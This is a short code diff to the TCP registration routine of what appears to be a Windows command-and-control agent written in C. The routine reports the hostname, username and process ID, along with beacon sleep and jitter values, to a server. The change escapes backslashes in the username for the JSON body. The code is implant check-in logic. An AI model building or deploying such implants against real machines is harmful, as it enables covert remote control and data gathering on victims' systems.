@@ -157,6 +157,11 @@ int transport_tcp_register(void) {
     ULONG usz=sizeof(username);
     if (!GetUserNameExA(2 /*NameSamCompatible*/, username, &usz))
         GetUserNameA(username, (DWORD*)&usz);
+    char username_j[512]={0};
+    for (int _i=0,_j=0; username[_i]&&_j<(int)sizeof(username_j)-2; _i++) {
+        if (username[_i]=='\\') username_j[_j++]='\\';
+        username_j[_j++]=username[_i];
+    }
 
     // TCP type 0 = REGISTER
     char body[1024];
@@ -164,7 +169,7 @@ int transport_tcp_register(void) {
         "{\"hostname\":\"%s\",\"username\":\"%s\",\"os\":\"windows/amd64\","
         "\"pid\":%lu,\"transport\":\"tcp\","
         "\"sleep_sec\":%d,\"jitter_pct\":%d,\"language\":\"c\"}",
-        hostname, username, (unsigned long)GetCurrentProcessId(),
+        hostname, username_j, (unsigned long)GetCurrentProcessId(),
         AGENT_SLEEP_SEC, AGENT_JITTER_PCT);
 
     if (!tcp_send_envelope(0, body)) return 0;
